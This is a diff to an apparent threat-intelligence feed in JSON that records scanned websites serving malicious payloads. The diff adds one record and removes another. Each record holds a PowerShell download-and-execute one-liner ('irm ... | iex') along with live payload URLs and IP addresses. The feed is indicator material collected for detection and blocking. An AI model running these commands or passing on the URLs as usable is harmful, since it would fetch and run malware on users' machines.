@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "aispar.africa",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/122c9ed39540c827"
+    ],
+    "IP": [
+      "102.212.247.147"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/122c9ed39540c827')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/122c9ed39540c827"
+    ],
+    "ReportId": "cmwz4gsnv0iq30omlwd650f6z",
+    "ScannedAt": "2026-11-27T15:14:22.926000+00:00"
+  },
+  {
     "UrlDomain": "staging.smilesbydelivery.com",
     "DeliveryUrl": [
       "browse-login.info",
@@ -12734,25 +12753,5 @@
     ],
     "ReportId": "cmwkv9kms1g1g0omljms1lzaw",
     "ScannedAt": "2026-11-17T15:48:02.874000+00:00"
-  },
-  {
-    "UrlDomain": "csogrant.bt",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "160.236.194.19"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwktvio01fxo0omlc5hd3w8p",
-    "ScannedAt": "2026-11-17T15:09:07.568000+00:00"
   }
 ]
